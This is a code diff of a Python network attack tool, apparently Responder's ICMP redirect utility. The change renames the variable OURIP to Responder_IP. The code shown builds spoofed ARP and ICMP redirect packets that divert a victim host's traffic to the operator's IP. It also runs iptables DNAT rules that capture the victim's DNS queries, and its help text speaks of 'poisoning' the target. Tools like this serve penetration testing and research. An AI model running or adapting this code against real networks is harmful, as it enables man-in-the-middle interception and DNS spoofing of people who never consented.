@@ -26,7 +26,7 @@ from pipes import quote
 parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                                prog=sys.argv[0],
                                )
-parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
+parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="Responder_IP")
 
 parser.add_option('-g', '--gateway',action="store", help="The ip address of the original gateway (issue the command 'route -n' to know where is the gateway", metavar="10.20.30.254",dest="OriginalGwAddr")
 
@@ -42,7 +42,7 @@ parser.add_option('-a', '--alternate',action="store", help="The alternate gatewa
 
 options, args = parser.parse_args()
 
-if options.OURIP is None:
+if options.Responder_IP is None:
     print "-i mandatory option is missing.\n"
     parser.print_help()
     exit(-1)
@@ -68,10 +68,10 @@ if options.ToThisHost is None:
     exit(-1)
 
 if options.AlternateGwAddr is None:
-    AlternateGwAddr = options.OURIP
+    AlternateGwAddr = options.Responder_IP
 
 #Setting some vars.
-OURIP = options.OURIP
+Responder_IP = options.Responder_IP
 OriginalGwAddr = options.OriginalGwAddr
 AlternateGwAddr = options.AlternateGwAddr
 VictimIP = options.VictimIP
@@ -84,7 +84,7 @@ def Show_Help(ExtraHelpData):
     help+= ExtraHelpData
     print help
 
-MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
+MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,Responder_IP)
 
 class Packet():
     fields = OrderedDict([
@@ -135,7 +135,7 @@ class ARPWhoHas(Packet):
 
     def calculate(self):
         self.fields["DstIP"] = inet_aton(self.fields["DstIP"])
-        self.fields["SenderIP"] = inet_aton(OURIP)
+        self.fields["SenderIP"] = inet_aton(Responder_IP)
 
 #####################################################################
 #ICMP Redirect Packets
@@ -188,7 +188,7 @@ class ICMPRedir(Packet):
 
     def calculate(self):
         #Set the values
-        self.fields["GwAddr"] = inet_aton(OURIP)
+        self.fields["GwAddr"] = inet_aton(Responder_IP)
         # Then CheckSum this packet
         CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
@@ -244,7 +244,7 @@ def IcmpRedirectSock(DestinationIP):
 def FindWhatToDo(ToThisHost2):
     if ToThisHost2 != None:
         Show_Help('Hit CRTL-C to kill this script')
-        RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
+        RunThisInLoop(ToThisHost, ToThisHost2,Responder_IP)
     if ToThisHost2 == None:
         Show_Help(MoreHelp)
         IcmpRedirectSock(DestinationIP=ToThisHost)
@@ -253,9 +253,9 @@ def FindWhatToDo(ToThisHost2):
 def RunThisInLoop(host, host2, ip):
     dns1 = pipes.quote(host)
     dns2 = pipes.quote(host2)
-    ouripadd = pipes.quote(ip)
-    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
-    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
+    Responder_IPadd = pipes.quote(ip)
+    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+Responder_IPadd+":53", shell=True)
+    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+Responder_IPadd+":53", shell=True)
     print "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
     while True:
         IcmpRedirectSock(DestinationIP=dns1)
